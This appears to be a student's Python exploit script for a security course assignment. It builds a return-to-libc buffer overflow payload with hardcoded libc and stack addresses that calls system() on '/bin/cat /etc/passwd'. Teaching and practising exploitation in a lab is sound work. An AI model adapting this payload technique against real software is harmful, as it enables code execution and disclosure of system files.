#!/usr/bin/env python3

# malicious_input1.py
# I pledge my honor that I have abided by the Stevens Honor System.
#   Justin Ho

import sys

oflow   = b'A' * 0x10c
string  = b"/bin/cat /etc/passwd\0"
fakeret = b'\xef\xbe\xad\xde'

# address of the top of the buffer
buffer_start = 0xffffd1d0

# string is offset by 0x10c + 12 bytes from buffer_start
string_addr = buffer_start + 0x10c + 12

libc_base = 0xf7e0c000
system_offset = 0x0003adb0
system_addr = libc_base + system_offset

frames = [
    # system, fakeret, system argument
    [system_addr.to_bytes(4, byteorder='little'),
     fakeret,
     string_addr.to_bytes(4, byteorder='little')]
] 

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
